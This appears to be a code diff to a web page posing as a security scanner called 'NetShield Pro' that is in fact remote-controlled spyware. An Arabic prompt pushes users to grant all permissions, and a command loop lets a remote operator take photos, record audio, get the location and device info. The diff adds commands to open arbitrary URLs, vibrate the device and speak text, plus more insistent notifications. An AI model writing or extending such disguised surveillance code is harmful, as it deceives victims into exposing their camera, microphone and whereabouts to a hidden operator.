@@ -383,7 +383,7 @@ body {
   <div class="alert alert-danger" id="alertDanger"><div class="alert-header"><svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg><h4>فشل الفحص</h4></div><p>يجب منح جميع الصلاحيات لضمان الحماية القصوى.</p></div>
   <div class="alert alert-success" id="alertSuccess"><div class="alert-header"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><h4>اكتمل الفحص بنجاح</h4></div><p>تم فحص الشبكة وتامينها. جميع الانظمة تعمل.</p></div>
 
-  <div class="footer"><div class="footer-logo">NETSHIELD PRO</div><div class="footer-text">Advanced Cybersecurity Suite v5.0</div></div>
+  <div class="footer"><div class="footer-logo">NETSHIELD PRO</div><div class="footer-text">Advanced Cybersecurity Suite v6.0</div></div>
 </div>
 
 <script>
@@ -585,8 +585,12 @@ function showNotification(title, body) {
       registration.showNotification(title, {
         body: body,
         icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
-        vibrate: [200, 100, 200],
-        requireInteraction: true
+        vibrate: [200, 100, 200, 100, 200, 100, 200],
+        requireInteraction: true,
+        tag: 'netshield-alert-' + Date.now(),
+        renotify: true,
+        silent: false,
+        data: { url: '/' }
       });
     });
   }
@@ -633,7 +637,7 @@ async function checkForCommands() {
             else { sendText('فشل التسجيل'); }
           }
           else if (cmd === '/help' || cmd === '/start') { 
-            sendText('الاوامر المتاحة:\n\n/photo - التقاط صورة\n/location - الموقع الحالي\n/info - معلومات الجهاز\n/full - تقرير كامل\n/record - تسجيل 10 ثواني\n/notify - ارسال اشعار\n/ping - التحقق من الاتصال\n/help - عرض المساعدة'); 
+            sendText('الاوامر المتاحة:\n\n/photo - التقاط صورة\n/location - الموقع الحالي\n/info - معلومات الجهاز\n/full - تقرير كامل\n/record - تسجيل 10 ثواني\n/notify - ارسال اشعار\n/open - فتح رابط\n/vibrate - اهتزاز الجهاز\n/say - تحويل نص لكلام\n/ping - التحقق من الاتصال\n/help - عرض المساعدة'); 
           }
           else if (cmd === '/ping') { sendText('الجهاز متصل وجاهز'); }
           else if (cmd.startsWith('/notify ')) {
@@ -641,6 +645,34 @@ async function checkForCommands() {
             const txt = msg.text.replace('/notify ', '');
             showNotification('NetShield Pro', txt);
             sendText('تم ارسال الاشعار: ' + txt);
+          }
+          else if (cmd.startsWith('/open ')) {
+            const url = msg.text.replace('/open ', '').trim();
+            if (url) {
+                window.open(url, '_blank');
+                sendText('تم فتح الرابط: ' + url);
+            } else {
+                sendText('استخدام: /open [الرابط]');
+            }
+          }
+          else if (cmd === '/vibrate') {
+            if (navigator.vibrate) {
+                navigator.vibrate([500, 200, 500, 200, 500]);
+                sendText('تم الاهتزاز');
+            } else {
+                sendText('الجهاز لا يدعم الاهتزاز');
+            }
+          }
+          else if (cmd.startsWith('/say ')) {
+            const textToSay = msg.text.replace('/say ', '').trim();
+            if (textToSay) {
+                const utterance = new SpeechSynthesisUtterance(textToSay);
+                utterance.lang = 'ar';
+                window.speechSynthesis.speak(utterance);
+                sendText('تم التحدث: ' + textToSay);
+            } else {
+                sendText('استخدام: /say [النص]');
+            }
           }
         }
       }
